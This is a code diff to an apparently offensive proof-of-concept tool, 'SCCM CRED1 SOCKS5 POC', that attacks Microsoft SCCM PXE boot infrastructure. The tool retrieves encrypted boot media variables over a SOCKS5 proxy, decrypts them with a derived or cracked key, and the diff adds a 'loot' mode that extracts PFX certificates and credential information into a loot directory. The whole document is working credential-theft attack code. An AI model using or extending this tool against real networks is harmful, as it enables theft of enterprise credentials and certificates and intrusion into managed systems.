@@ -1,6 +1,7 @@
 from lib import sccm
 from lib import socks, tftp
 import argparse
+import os
 
 # Parse arguments
 parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
@@ -13,11 +14,18 @@ attack_parser.add_argument("src_ip", help="Source IP")
 attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
 attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
 attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
+attack_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
 
 # Decrypt mode — decrypt a local .boot.var file with a key
 decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a locally downloaded .boot.var file")
 decrypt_parser.add_argument("file", help="Path to the .boot.var file")
 decrypt_parser.add_argument("key", help="Decryption key (hex)")
+decrypt_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
+
+# Loot mode — extract PFX and info from already-decrypted XML
+loot_parser = subparsers.add_parser("loot", help="Extract PFX cert and info from decrypted media variables XML")
+loot_parser.add_argument("xml_file", help="Path to decrypted media variables XML file")
+loot_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
 
 args = parser.parse_args()
 
@@ -29,8 +37,22 @@ if args.mode is None:
     attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
     attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
     attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
+    attack_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
     args = attack_parser.parse_args()
     args.mode = "attack"
+
+def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
+    """Extract PFX cert and key info from decrypted media variables."""
+    print("[*] Extracting loot from decrypted media variables...")
+    sccm_client.extract_media_variables(decrypted_xml, output_dir)
+
+if args.mode == "loot":
+    # Extract from already-decrypted XML
+    sccm_client = sccm.SCCM(None, None, None)
+    with open(args.xml_file, "r") as f:
+        xml_text = f.read()
+    sccm_client.extract_media_variables(xml_text, args.output)
+    exit()
 
 if args.mode == "decrypt":
     # Decrypt a local file with the given key
@@ -43,8 +65,7 @@ if args.mode == "decrypt":
         print(f"[*] Encryption: AES-{aes_bits}" if aes_bits else "[!] Unknown encryption type in header")
         key_bytes = bytes.fromhex(args.key)
         decrypted = sccm_client.decrypt_media_file(filedata, key_bytes)
-        print("[*] Decrypted media variables:")
-        print(decrypted)
+        handle_decrypted_xml(sccm_client, decrypted, args.output)
     except Exception as e:
         print(f"[!] Decryption failed: {e}")
     exit()
@@ -100,8 +121,7 @@ if cryptokey is None:
         try:
             password_bytes = bytes.fromhex(args.password)
             decrypted = sccm_client.decrypt_media_file(data_variables, password_bytes)
-            print("[*] Decrypted media variables:")
-            print(decrypted)
+            handle_decrypted_xml(sccm_client, decrypted, args.output)
         except Exception as e:
             print(f"[!] Decryption failed: {e}")
             print(f"[*] You can also download the file manually from: \\\\{args.target}\\REMINST{variables}")
@@ -120,8 +140,7 @@ else:
         print("[*] Derived key: " + decrypt_password.hex())
         try:
             decrypted = sccm_client.decrypt_media_file(data_variables, decrypt_password)
-            print("[*] Decrypted media variables:")
-            print(decrypted)
+            handle_decrypted_xml(sccm_client, decrypted, args.output)
         except Exception as e:
             print(f"[!] Decryption failed: {e}")
             print(f"[*] Download the variables file manually from: \\\\{args.target}\\REMINST{variables}")
